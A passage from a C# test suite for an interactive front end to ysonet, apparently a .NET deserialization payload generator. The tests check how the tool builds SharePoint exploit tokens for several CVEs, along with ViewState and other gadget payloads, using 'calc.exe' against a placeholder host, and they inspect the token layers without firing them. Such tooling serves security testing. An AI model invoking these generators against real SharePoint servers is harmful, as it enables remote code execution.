            FindEditable(f, "file").Value = "c:/temp/x.txt"; FindEditable(f, "file").Touched = true;
            FindEditable(f, "url").Value = "http://a/b"; FindEditable(f, "url").Touched = true;
            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a2.Contains("--mode write_file") && a2.Contains("--file") && a2.Contains("--url"), "write_file argv: " + a2);
            AssertTrue(!a2.Contains("--command"), "write_file argv excludes command");
        }

        private static void ClipboardModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("Clipboard");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 2, "two clipboard modes");

            // Default = winforms: format shown, xamlvariant hidden.
            AssertTrue(!FindEditable(f, "format").Hidden, "winforms: format shown");
            AssertTrue(FindEditable(f, "xamlvariant").Hidden, "winforms: xamlvariant hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--mode winforms"), "winforms argv has mode: " + a1);
            AssertTrue(!a1.Contains("--xamlvariant"), "winforms argv excludes xamlvariant");

            // Switch to wpfxaml: xamlvariant shown, format hidden and dropped.
            mode.Value = mode.Choices[1];
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "xamlvariant").Hidden, "wpfxaml: xamlvariant shown");
            AssertTrue(FindEditable(f, "format").Hidden, "wpfxaml: format hidden");
            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a2.Contains("--mode wpfxaml"), "wpfxaml argv has mode: " + a2);
            AssertTrue(!a2.Contains("--format"), "wpfxaml argv excludes format");
        }

        private static void SharePointModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("SharePoint");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 7, "seven SharePoint CVE modes");
            // The CVE selector is the mode picker, not a duplicate 'cve' field.
            AssertTrue(FindEditable(f, "cve") == null, "cve is the mode, not a separate field");

            // Default = CVE-2025-49704: inner 'variant' shown; gadget/useurl/target hidden.
            AssertTrue(FindEditable(f, "command").Required, "command required");
            AssertTrue(!FindEditable(f, "variant").Hidden, "49704: inner variant shown");
            AssertTrue(FindEditable(f, "gadget").Hidden && FindEditable(f, "useurl").Hidden, "49704: gadget/useurl hidden");
            AssertTrue(FindEditable(f, "target").Hidden, "49704: target hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--cve CVE-2025-49704"), "49704 argv has cve: " + a1);
            AssertTrue(!a1.Contains("--gadget") && !a1.Contains("--useurl") && !a1.Contains("--target"),
                "49704 argv excludes gadget/useurl/target");

            // Modes are selected by their CVE identity, not a brittle list index, so
            // adding a mode never silently shifts what these checks target.

            // CVE-2020-1147: inner 'gadget' shown; it generates via CLI.
            mode.Value = PickModeByCve(mode, "CVE-2020-1147");
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "gadget").Hidden, "1147: gadget shown");
            AssertTrue(FindEditable(f, "variant").Hidden, "1147: variant hidden");
            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a2.Contains("--cve CVE-2020-1147") && a2.Contains("--gadget"), "1147 argv: " + a2);
            RunResult r2 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
            AssertTrue(r2.Success, "1147 generates via CLI args: " + r2.ErrorMessage);

            // CVE-2018-8421: inner 'useurl' shown; it generates via CLI.
            mode.Value = PickModeByCve(mode, "CVE-2018-8421");
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "useurl").Hidden, "8421: useurl shown");
            string a3 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a3.Contains("--cve CVE-2018-8421"), "8421 argv: " + a3);
            RunResult r3 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
            AssertTrue(r3.Success, "8421 generates via CLI args: " + r3.ErrorMessage);

            // CVE-2026-50522: command, target, gadget, and the formbody switch shown;
            // only command is required (target is transport, needed just for --formbody).
            // The unrelated variant/useurl fields stay hidden. Argv carries the cve,
            // target, and gadget, and it generates via CLI (default = wresult token).
            mode.Value = PickModeByCve(mode, "CVE-2026-50522");
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "command").Hidden && !FindEditable(f, "target").Hidden
                && !FindEditable(f, "gadget").Hidden && !FindEditable(f, "formbody").Hidden,
                "2026-50522: command/target/gadget/formbody shown");
            AssertTrue(FindEditable(f, "command").Required && !FindEditable(f, "target").Required,
                "2026-50522: command required, target optional");
            AssertTrue(FindEditable(f, "variant").Hidden && FindEditable(f, "useurl").Hidden,
                "2026-50522: variant/useurl hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            FindEditable(f, "target").Value = "https://sharepoint.example/"; FindEditable(f, "target").Touched = true;
            string a4 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a4.Contains("--cve CVE-2026-50522") && a4.Contains("--target") && a4.Contains("--gadget"),
                "2026-50522 argv: " + a4);
            RunResult r4 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
            AssertTrue(r4.Success, "2026-50522 generates via CLI args: " + r4.ErrorMessage);
        }

        // Selects a SharePoint interactive mode by its CVE identity (the mode Name),
        // so adding a mode never silently shifts a positional index.
        private static string PickModeByCve(EditableField mode, string cveId)
        {
            foreach (string choice in mode.Choices)
                if (choice.IndexOf(cveId, StringComparison.OrdinalIgnoreCase) >= 0)
                    return choice;
            throw new Exception("no SharePoint mode choice found for " + cveId);
        }

        // CVE-2026-50522 DEFAULT output framing. The default is the wresult token XML plus
        // a delivery comment (like the other SharePoint modes), NOT a form body. Inspects
        // the token layer by layer (RSTR/SCT XML -> Base64 -> deflate -> BF header) WITHOUT
        // ever deserializing or firing the embedded gadget.
        private static void SharePointCve2026Framing()
        {
            RunResult r = PayloadRunner.RunPlugin("SharePoint", new[]
            {
                "--cve", "CVE-2026-50522",
                "--target", "https://sharepoint.example/",
                "--gadget", "TypeConfuseDelegate",
                "-c", "calc.exe",
            });
            AssertTrue(r.Success, "2026-50522 generates: " + r.ErrorMessage);
            string output = r.Raw as string;
            AssertTrue(!string.IsNullOrEmpty(output), "2026-50522 returns a string");

            // Default output is the token, not a form body: it must NOT start with the
            // url-encoded wa field, and it must carry a delivery comment that shows the POST.
            AssertTrue(!output.StartsWith("wa="), "default output is the token, not a form body: " + output);
            int commentAt = output.IndexOf("<!--", StringComparison.Ordinal);
            AssertTrue(commentAt > 0, "default output has a delivery comment");
            string comment = output.Substring(commentAt);
            AssertTrue(comment.Contains("wa=wsignin1.0") && comment.Contains("wctx=") && comment.Contains("wresult="),
                "the comment shows the wa/wctx/wresult fields");
            AssertTrue(comment.Contains("/_trust/default.aspx"), "the comment names the trust endpoint");
            AssertTrue(comment.Contains("--formbody"), "the comment points at --formbody for the full body");
            // The provided --target is echoed as the wctx example in the comment.
            AssertTrue(comment.Contains("wctx=https://sharepoint.example/"), "the comment uses the given target as the wctx example: " + comment);

            // The part before the comment is the wresult token XML. Inspect it in depth.
            string wresult = output.Substring(0, commentAt).Trim();
            AssertTrue(XmlWellFormednessError(wresult) == null, "wresult is well-formed XML");
            AssertSharePoint2026TokenStructure(wresult);
        }

        // CVE-2026-50522 --formbody output framing. This mode emits the complete
        // URL-encoded wa/wctx/wresult sign-in body. Inspects it layer by layer WITHOUT
        // deserializing or firing the embedded gadget.
        private static void SharePointCve2026FormBody()
        {
            RunResult r = PayloadRunner.RunPlugin("SharePoint", new[]
            {
                "--cve", "CVE-2026-50522",
                "--formbody",
                "--target", "https://sharepoint.example/",
                "--gadget", "TypeConfuseDelegate",
                "-c", "calc.exe",
            });
            AssertTrue(r.Success, "2026-50522 --formbody generates: " + r.ErrorMessage);
            string body = r.Raw as string;
            AssertTrue(!string.IsNullOrEmpty(body), "2026-50522 --formbody returns a string form body");

            // Exactly three fields, in a deterministic order, with no trailing text.
            string[] fields = body.Split('&');
            AssertTrue(fields.Length == 3, "form body has exactly three fields: " + body);
            AssertTrue(fields[0].StartsWith("wa=") && fields[1].StartsWith("wctx=") && fields[2].StartsWith("wresult="),
                "form fields are wa, wctx, wresult in order: " + body);

            string wa = System.Web.HttpUtility.UrlDecode(fields[0].Substring("wa=".Length));
            string wctx = System.Web.HttpUtility.UrlDecode(fields[1].Substring("wctx=".Length));
            string wresult = System.Web.HttpUtility.UrlDecode(fields[2].Substring("wresult=".Length));

            AssertEqual("wsignin1.0", wa, "wa is the sign-in action");
            AssertEqual("https://sharepoint.example/", wctx, "wctx is the normalized target base URL");
            AssertTrue(XmlWellFormednessError(wresult) == null, "wresult is well-formed XML");
            AssertSharePoint2026TokenStructure(wresult);
        }

        // Parses a CVE-2026-50522 wresult token safely (no DTD) and asserts the
        // trust/SCT/cookie structure, the identifier shape, and that the cookie inflates
        // to a BinaryFormatter stream. Never deserializes the payload.
        private static void AssertSharePoint2026TokenStructure(string wresult)
        {
            var doc = new System.Xml.XmlDocument();
            using (var xr = System.Xml.XmlReader.Create(new StringReader(wresult),
                new System.Xml.XmlReaderSettings { DtdProcessing = System.Xml.DtdProcessing.Prohibit }))
            {
                doc.Load(xr);
            }

            const string nsTrust = "http://schemas.xmlsoap.org/ws/2005/02/trust";
            const string nsSc = "http://schemas.xmlsoap.org/ws/2005/02/sc";
            const string nsSecurity = "http://schemas.microsoft.com/ws/2006/05/security";

            System.Xml.XmlElement rstr = doc.DocumentElement;
            AssertEqual("RequestSecurityTokenResponse", rstr.LocalName, "root is RequestSecurityTokenResponse");
            AssertEqual(nsTrust, rstr.NamespaceURI, "RSTR is in the trust namespace");

            System.Xml.XmlElement requested = FirstChildElement(rstr);
            AssertEqual("RequestedSecurityToken", requested.LocalName, "RSTR wraps RequestedSecurityToken");
            AssertEqual(nsTrust, requested.NamespaceURI, "RequestedSecurityToken is in the trust namespace");

            System.Xml.XmlElement sct = FirstChildElement(requested);
            AssertEqual("SecurityContextToken", sct.LocalName, "it holds a SecurityContextToken");
            AssertEqual(nsSc, sct.NamespaceURI, "SCT is in the security-context namespace");

            System.Xml.XmlElement identifier = ChildByLocalName(sct, "Identifier");
            AssertTrue(identifier != null && identifier.NamespaceURI == nsSc, "SCT has an Identifier in the sc namespace");
            System.Xml.XmlElement cookie = ChildByLocalName(sct, "Cookie");
            AssertTrue(cookie != null && cookie.NamespaceURI == nsSecurity, "SCT has a Cookie in the security namespace");

            // Identifier shape: urn:unique-id:securitycontext:<32 lowercase hex Guid chars>.
            const string idPrefix = "urn:unique-id:securitycontext:";
            string id = identifier.InnerText.Trim();
            AssertTrue(id.StartsWith(idPrefix, StringComparison.Ordinal), "identifier has the urn prefix: " + id);
            string guidPart = id.Substring(idPrefix.Length);
            AssertTrue(guidPart.Length == 32, "identifier ends with a 32-char Guid: " + id);
            foreach (char ch in guidPart)
                AssertTrue((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f'), "Guid N is lowercase hex: " + id);

            // Cookie = Base64(Deflate(BinaryFormatter gadget)). Decode and inflate, then
            // assert a BinaryFormatter stream header. Never deserialize it.
            byte[] deflated = Convert.FromBase64String(cookie.InnerText.Trim());
            byte[] bf;
            using (var input = new MemoryStream(deflated))
            using (var ds = new System.IO.Compression.DeflateStream(input, System.IO.Compression.CompressionMode.Decompress))
            using (var output = new MemoryStream())
            {
                ds.CopyTo(output);
                bf = output.ToArray();
            }
            byte[] head = new byte[] { 0, 1, 0, 0, 0, 255, 255, 255, 255 };
            bool okHead = bf.Length > head.Length;
            for (int i = 0; okHead && i < head.Length; i++) if (bf[i] != head[i]) okHead = false;
            AssertTrue(okHead, "the cookie inflates to a BinaryFormatter stream");
        }

        // CVE-2026-50522 input validation. Every case inspects the error, never a payload.
        private static void SharePointCve2026Validation()
        {
            const string goodTarget = "https://sharepoint.example/";

            // A valid run first, so leftover statics cannot make a negative case pass by
            // accident later. This also proves the default (token) happy path from the CLI.
            RunResult ok = RunSharePoint2026("calc.exe", goodTarget, "TypeConfuseDelegate", true);
            AssertTrue(ok.Success, "valid 2026-50522 run succeeds: " + ok.ErrorMessage);

            // The default token output does NOT need --target (wctx is transport only).
            RunResult noTargetDefault = RunSharePoint2026("calc.exe", null, "TypeConfuseDelegate", false);
            AssertTrue(noTargetDefault.Success, "default token output works without --target: " + noTargetDefault.ErrorMessage);
            AssertTrue(!(noTargetDefault.Raw as string).StartsWith("wa="), "default output without --target is the token, not a form body");

            // --formbody DOES require --target (it fills wctx).
            RunResult formNoTarget = RunSharePoint2026("calc.exe", null, "TypeConfuseDelegate", false, true);
            AssertTrue(!formNoTarget.Success && formNoTarget.ErrorMessage.IndexOf("target", StringComparison.OrdinalIgnoreCase) >= 0,
                "--formbody without --target is rejected: " + formNoTarget.ErrorMessage);

            // --formbody with a good target succeeds and yields a url-encoded form body.
            RunResult formOk = RunSharePoint2026("calc.exe", goodTarget, "TypeConfuseDelegate", true, true);
            AssertTrue(formOk.Success && (formOk.Raw as string).StartsWith("wa="),
                "--formbody with --target yields a form body: " + formOk.ErrorMessage);

            // Relative target.
            RunResult relative = RunSharePoint2026("calc.exe", "/sites/x", "TypeConfuseDelegate", true);
            AssertTrue(!relative.Success && relative.ErrorMessage.IndexOf("absolute", StringComparison.OrdinalIgnoreCase) >= 0,
                "relative target is rejected: " + relative.ErrorMessage);

            // Non-HTTP(S) target.
            RunResult ftp = RunSharePoint2026("calc.exe", "ftp://host/", "TypeConfuseDelegate", true);
            AssertTrue(!ftp.Success && ftp.ErrorMessage.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0,
                "non-http target is rejected: " + ftp.ErrorMessage);

            // Target with a query string, a fragment, or user info.
            RunResult query = RunSharePoint2026("calc.exe", "https://host/?a=1", "TypeConfuseDelegate", true);
            AssertTrue(!query.Success, "target with query is rejected: " + query.ErrorMessage);
            RunResult frag = RunSharePoint2026("calc.exe", "https://host/#x", "TypeConfuseDelegate", true);
            AssertTrue(!frag.Success, "target with fragment is rejected: " + frag.ErrorMessage);
            RunResult userinfo = RunSharePoint2026("calc.exe", "https://user:pass@host/", "TypeConfuseDelegate", true);
            AssertTrue(!userinfo.Success, "target with user info is rejected: " + userinfo.ErrorMessage);

            // Unknown gadget.
            RunResult unknownGadget = RunSharePoint2026("calc.exe", goodTarget, "NoSuchGadget_2026", true);
            AssertTrue(!unknownGadget.Success && unknownGadget.ErrorMessage.IndexOf("Gadget", StringComparison.OrdinalIgnoreCase) >= 0,
                "unknown gadget is rejected: " + unknownGadget.ErrorMessage);

            // Known gadget without BinaryFormatter support (ObjectDataProvider is Xaml/Json only).
            RunResult noBf = RunSharePoint2026("calc.exe", goodTarget, "ObjectDataProvider", true);
            AssertTrue(!noBf.Success && noBf.ErrorMessage.IndexOf("BinaryFormatter", StringComparison.OrdinalIgnoreCase) >= 0,
                "a gadget without BinaryFormatter support is rejected: " + noBf.ErrorMessage);

            // Missing command (reset the static so a leftover value cannot satisfy it).
            ResetStaticString(typeof(ysonet.Plugins.SharePointPlugin), "command", "");
            RunResult noCommand = PayloadRunner.RunPlugin("SharePoint", new[]
            {
                "--cve", "CVE-2026-50522", "--target", goodTarget, "--gadget", "TypeConfuseDelegate",
            });
            AssertTrue(!noCommand.Success, "missing command is rejected: " + noCommand.ErrorMessage);

            // An older SharePoint mode still works without --target, proving the option
            // is mode-specific and did not leak in as a global requirement.
            RunResult older = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" });
            AssertTrue(older.Success, "an older SharePoint CVE still generates without --target: " + older.ErrorMessage);
        }

        // Runs SharePoint CVE-2026-50522 with explicit inputs. Resets the leaky static
        // command/gadget fields first so each call is order-independent; production
        // already resets target on every run. When target is null, --target is omitted.
        private static RunResult RunSharePoint2026(string command, string target, string gadget, bool passTarget, bool useFormBody = false)
        {
            ResetStaticString(typeof(ysonet.Plugins.SharePointPlugin), "command", "");
            ResetStaticString(typeof(ysonet.Plugins.SharePointPlugin), "gadget", "TypeConfuseDelegate");
            // The formBody static is reset by the plugin on every run, so each call is
            // order-independent regardless of a prior --formbody run.
            var argv = new List<string> { "--cve", "CVE-2026-50522", "-c", command, "--gadget", gadget };
            if (useFormBody) argv.Add("--formbody");
            if (passTarget && target != null)
            {
                argv.Add("--target");
                argv.Add(target);
            }
            return PayloadRunner.RunPlugin("SharePoint", argv.ToArray());
        }

        // --no-comment strips the trailing explanatory HTML comment from SharePoint
        // output, for a comment-bearing CVE (2020-1147, no external DLLs) and for the
        // 2026 token. Without the flag the comment is present.
        private static void SharePointNoComment()
        {
            RunResult withC = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe" });
            AssertTrue(withC.Success, "2020-1147 generates: " + withC.ErrorMessage);
            AssertTrue((withC.Raw as string).Contains("<!--"), "default output includes the explanatory comment");

            RunResult noC = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe", "--no-comment" });
            AssertTrue(noC.Success, "2020-1147 --no-comment generates: " + noC.ErrorMessage);
            AssertTrue(!(noC.Raw as string).Contains("<!--"), "--no-comment removes the explanatory comment");

            // The 2026 default token also drops its delivery comment and returns just the token.
            RunResult tok = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2026-50522", "-c", "calc.exe", "--no-comment" });
            AssertTrue(tok.Success, "2026-50522 --no-comment generates: " + tok.ErrorMessage);
            string tokS = tok.Raw as string;
            AssertTrue(!tokS.Contains("<!--") && tokS.StartsWith("<RequestSecurityTokenResponse"),
                "2026-50522 --no-comment returns just the wresult token: " + tokS);
        }

        // rawcmd is threaded into the SharePoint gadget, not hardcoded: toggling it changes
        // the embedded command (cmd /c X vs X), hence the payload bytes. Compare the raw
        // payload (via --no-comment so only the payload differs, not any comment text).
        private static void SharePointRawcmdConfigurable()
        {
            RunResult def = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe", "--no-comment" });
            RunResult raw = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe", "--no-comment", "--rawcmd" });
            AssertTrue(def.Success && raw.Success, "both 2020-1147 runs generate");
            AssertTrue((def.Raw as string) != (raw.Raw as string),
                "--rawcmd changes the SharePoint payload (the flag is honored, not hardcoded)");
        }

        // ApplicationTrust embeds an optional commented-out block; --no-comment drops it,
        // leaving clean ApplicationTrust XML.
        private static void ApplicationTrustNoComment()
        {
            RunResult with = PayloadRunner.RunPlugin("ApplicationTrust", new[] { "-c", "calc.exe" });
            AssertTrue(with.Success && (with.Raw as string).Contains("<!--"),
                "ApplicationTrust default includes the comment: " + with.ErrorMessage);
            RunResult without = PayloadRunner.RunPlugin("ApplicationTrust", new[] { "-c", "calc.exe", "--no-comment" });
            AssertTrue(without.Success, "ApplicationTrust --no-comment generates: " + without.ErrorMessage);
            string s = without.Raw as string;
            AssertTrue(!s.Contains("<!--") && s.Contains("<ApplicationTrust"),
                "--no-comment leaves clean ApplicationTrust XML with no comment: " + s);
        }

        // Every command-taking plugin exposes --rawcmd (consistency with ViewState), and
        // SharePoint additionally exposes --minify/--usesimpletype/--no-comment. Locks in
        // the config-flag consistency so a future plugin cannot silently hardcode them.
        private static void CommandPluginsExposeConfigFlags()
        {
            string[] cmdPlugins =
            {
                "Resx", "DotNetNuke", "ApplicationTrust", "Altserialization", "Clipboard",
                "TransactionManagerReenlist", "SessionSecurityTokenHandler",
                "MachineKeySessionSecurityTokenHandler", "ViewState", "SharePoint",
            };
            foreach (string p in cmdPlugins)
            {
                IPlugin inst = PluginRegistry.CreatePluginInstance(p);
                AssertTrue(inst != null, p + " loads");
                var fields = OptionField.FromOptionSet(inst.Options());
                AssertTrue(FindField(fields, "rawcmd") != null, p + " exposes --rawcmd");
            }

            var spFields = OptionField.FromOptionSet(PluginRegistry.CreatePluginInstance("SharePoint").Options());
            AssertTrue(FindField(spFields, "minify") != null, "SharePoint exposes --minify");
            AssertTrue(FindField(spFields, "usesimpletype") != null, "SharePoint exposes --ust/--usesimpletype");
            AssertTrue(FindField(spFields, "no-comment") != null, "SharePoint exposes --no-comment");
        }

        private static void ResetStaticString(Type t, string field, string value)
        {
            var f = t.GetField(field, System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
            if (f != null && f.FieldType == typeof(string)) f.SetValue(null, value);
        }

        private static System.Xml.XmlElement FirstChildElement(System.Xml.XmlElement parent)
        {
            foreach (System.Xml.XmlNode n in parent.ChildNodes)
                if (n is System.Xml.XmlElement) return (System.Xml.XmlElement)n;
            throw new Exception("no child element under " + parent.LocalName);
        }

        private static System.Xml.XmlElement ChildByLocalName(System.Xml.XmlElement parent, string localName)
        {
            foreach (System.Xml.XmlNode n in parent.ChildNodes)
                if (n is System.Xml.XmlElement && n.LocalName == localName) return (System.Xml.XmlElement)n;
            return null;
        }

        private static void BannerShowsBetaAndVersion()
        {
            var keys = new ScriptedKeyReader();
            keys.Escape(); // quit at the top menu after the banner is shown
            string stderr;
            DriveWizard(keys, out stderr);
            AssertTrue(stderr.ToLowerInvariant().Contains("beta"), "banner marks interactive mode as beta");
            string ver = Wizard.ProductVersion();
            AssertTrue(!string.IsNullOrEmpty(ver), "a product version is available");
            AssertTrue(stderr.Contains(ver), "banner shows the product version (" + ver + ")");
        }

        private static void ExplicitEmptyStringViaSpace()
        {
            // viewStateUserKey is the real case: ViewState checks it with != null, so
            // an empty string differs from unset. The space convention must let the
            // user express that and pass it as --viewstateuserkey "".
            var editor = new ModuleEditor(null, null, false, null, null);
            var vs = editor.BuildFieldsForTest("ViewState");
            EditableField k = FindEditable(vs, "viewstateuserkey");
            AssertTrue(k != null, "viewstateuserkey field present");
            AssertTrue(string.IsNullOrEmpty(k.Value) && !k.ExplicitEmpty, "starts unset");

            // Unset is not passed on the command line.
            AssertTrue(!string.Join("|", editor.PluginArgvForTest().ToArray()).Contains("--viewstateuserkey"),
                "unset viewstateuserkey is not passed");

            // One space -> an explicit empty string, shown distinctly and passed as "".
            ModuleEditor.CommitTextForTest(k, " ");
            AssertTrue(k.ExplicitEmpty && k.Value == "", "one space = explicit empty string");
            AssertEqual("(empty string)", k.DisplayValue, "explicit empty shows distinctly (not '(unset)')");
            string argv = string.Join("|", editor.PluginArgvForTest().ToArray());
            AssertTrue(argv.Contains("--viewstateuserkey|"), "explicit empty is passed as --viewstateuserkey \"\": " + argv);

            // Two spaces -> a single real space value; three -> two spaces.
            ModuleEditor.CommitTextForTest(k, "  ");
            AssertTrue(!k.ExplicitEmpty && k.Value == " ", "two spaces = one space value");
            ModuleEditor.CommitTextForTest(k, "   ");
            AssertTrue(!k.ExplicitEmpty && k.Value == "  ", "three spaces = two spaces");

            // Mixed input is taken literally: leading/trailing spaces are NOT trimmed.
            ModuleEditor.CommitTextForTest(k, " abc ");
            AssertTrue(k.Value == " abc " && !k.ExplicitEmpty, "surrounding spaces preserved (not trimmed)");

            // Truly empty input -> unset again (not passed).
            ModuleEditor.CommitTextForTest(k, "");
            AssertTrue(!k.ExplicitEmpty && string.IsNullOrEmpty(k.Value), "empty input -> unset");
            AssertTrue(!string.Join("|", editor.PluginArgvForTest().ToArray()).Contains("--viewstateuserkey"),
                "back to unset is not passed");
        }

        private static void ConditionalRequired()
        {
            // ViewState: the genuinely-required key stays flagged; the conditional
            // ones (mode/encryption/OSF-specific, or optional) do not.
            var vs = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ViewState");
            AssertTrue(FindEditable(vs, "validationkey").Required, "validationkey is required");
            AssertTrue(!FindEditable(vs, "decryptionkey").Required, "decryptionkey is conditional (encryption)");
            AssertTrue(!FindEditable(vs, "mackey").Required, "mackey is conditional (osf)");
            AssertTrue(!FindEditable(vs, "path").Required, "path is optional");
            AssertTrue(!FindEditable(vs, "apppath").Required, "apppath is conditional");
            AssertTrue(!FindEditable(vs, "viewstateuserkey").Required, "viewstateuserkey is conditional (sometimes)");

            // Mode-conditional options in other plugins are not required either.
            var dnn = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("DotNetNuke");
            AssertTrue(!FindEditable(dnn, "file").Required, "DotNetNuke file is mode-conditional");
            AssertTrue(!FindEditable(dnn, "url").Required, "DotNetNuke url is mode-conditional");
        }

        private static void ThemeApply()
        {
            string original = ConsoleStyle.CurrentThemeName;
            try
            {
                AssertTrue(ConsoleStyle.Themes.Length >= 3, "several themes available");
                ConsoleStyle.ApplyTheme("Green");
                AssertEqual("Green", ConsoleStyle.CurrentThemeName, "current theme updated");
                AssertEqual(ConsoleColor.DarkCyan, ConsoleStyle.Accent, "Green theme sets its accent");
                ConsoleStyle.ApplyTheme("Blue");
                AssertEqual(ConsoleColor.Cyan, ConsoleStyle.Accent, "Blue theme sets its accent");
            }
            finally
            {
                ConsoleStyle.ApplyTheme(original);
            }
        }

        private static void WizardBlocksMissingRequired()
        {
            // ObjRef takes a URL (required) and has no default, so Generate with it
            // empty must be blocked with a message - and must NOT drop out of the
            // wizard (the following keys still drive it).
            var keys = new ScriptedKeyReader();
            keys.Enter();                  // top -> gadget
            keys.Type("ObjRef").Enter();   // module picker
            keys.Type("Generate").Enter(); // blocked: URL is required and empty
            keys.Escape();                 // leave form
            keys.Escape();                 // leave module list
            keys.Escape();                 // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "blocked generation emits no payload");
            AssertTrue(stderr.Contains("Not ready to generate"), "a clear not-ready report is shown");
            AssertTrue(stderr.Contains("command") && stderr.Contains("Example:"),
                "the report names the setting and shows an example");
            AssertTrue(stderr.Contains("Bye."), "the wizard is still running (reached the top-menu quit)");
        }

        private static void BlockedReportEnumeratesMissing()
        {
            // A plugin mode that requires several settings lists each missing one by
            // name, so the user fixes them all at once (ViewState 'Exploit' needs a
            // command and a validationkey).
            var ed = new ModuleEditor(null, null, false, null, null);
            ed.BuildFieldsForTest("ViewState");
            List<string> probs = ed.MissingRequiredModeProblemsForTest();
            AssertTrue(probs != null && probs.Count >= 2, "each missing required setting is enumerated");
            bool cmd = false, vk = false;
            foreach (string p in probs)
            {
                if (p.StartsWith("command")) cmd = true;
                if (p.StartsWith("validationkey")) vk = true;
                AssertTrue(p.Contains(":"), "each problem reads 'name: explanation' - " + p);
            }
            AssertTrue(cmd && vk, "both required ViewState settings are named: " + string.Join(" | ", probs.ToArray()));
        }

        private static void BlockedReportShowsCommandExample()
        {
            // A gadget whose -c is a URL (ObjRef) reports the expected input type and a
            // concrete example, not just "a value is missing".
            var ed = new ModuleEditor(null, null, true, null, null);
            ed.BuildFieldsForTest("ObjRef");
            string p = ed.MissingRequiredCommandProblemForTest();
            AssertTrue(p != null, "a missing required command is reported");
            AssertTrue(p.Contains("command") && p.Contains("URL") && p.Contains("Example:") && p.Contains("http"),
                "the command problem names the setting, its type, and a URL example: " + p);
        }

        private static void ColumnsHomeEndNav()
        {
            // End jumps to the last setting (the Reset action, always last).
            var end = DriveFrames(k => k.Enter().Enter().End().Escape().Escape().Escape());
            AssertTrue(AnyFrame(end, "> [ Reset settings to defaults ]"), "End jumps to the last setting");
        }

        private static void PickerHomeEnd()
        {
            // End selects the last match, Home the first (deterministic list).
            var items = new List<string> { "alpha", "bravo", "charlie", "delta" };
            string last = WithSwallowedError(() =>
                new Picker(new ScriptedKeyReader().End().Enter()).Show("pick", items, null));
            AssertEqual("delta", last, "End selects the last item");
            string first = WithSwallowedError(() =>
                new Picker(new ScriptedKeyReader().End().Home().Enter()).Show("pick", items, null));
            AssertEqual("alpha", first, "Home selects the first item");
        }

        private static void PickerFitsShortWindow()
        {
            // On a real console the picker draws a fixed ~24-line block (12 rows + an
            // 8-line preview + a Search and count line). On a SHORT window that block
            // is taller than the screen, so the relative MoveUp clamps at row 0 and
            // the frame desyncs - the title scrolls off and a second copy stacks (the
            // reported small-screen bug). The block must instead shrink to fit, so the
            // title, Search line and count line all stay on ONE screen.
            var prevTerm = Term.Current;
            try
            {
                var vt = new VirtualTerminal(80, 12); // deliberately short
                Term.Current = vt;

                var items = new List<string>();
                for (int i = 0; i < 30; i++)
                    items.Add("Gadget" + i.ToString("00"));

                var keys = new RecordingKeyReader(vt);
                keys.Down().Down().Down().Enter();
                new Picker(keys).Show("PickTitle", items, s => "preview for " + s);

                Frame f = vt.Capture(); // the settled screen after navigating
                AssertEqual(1, RowsContaining(f, "PickTitle"),
                    "the title appears on exactly one row (no stacking, not scrolled off)");
                AssertTrue(f.Contains("Search:"), "the Search line stayed on screen");
                AssertTrue(f.Contains("match(es)"), "the count line stayed on screen");
            }
            finally
            {
                Term.Current = prevTerm;
            }
        }

        private static void FallbackClearsTopMenuOnShortWindow()
        {
            // A short console fails ColumnsFit, so the gadget flow uses RunFallback.
            // That path must clear the screen before the picker, exactly as the columns
            // path does; otherwise the top menu stays drawn above the picker (the stacked
            // "Build a gadget payload ... Pick a gadget" screen reported on a small window).
            var prevTerm = Term.Current;
            bool prevForce = ModuleEditor.ForceFallback;
            try
            {
                var vt = new VirtualTerminal(80, 14); // too short for the columns view
                Term.Current = vt;
                ModuleEditor.ForceFallback = false;   // let ColumnsFit pick the fallback

                var k = new RecordingKeyReader(vt);
                k.Enter();   // top menu -> Build a gadget payload (fallback picker)
                k.Escape();  // Esc at the picker -> back to the top menu
                k.Escape();  // quit
                try { new Wizard(k, new MemoryStream()).Run(); } catch { }

                Frame picker = null;
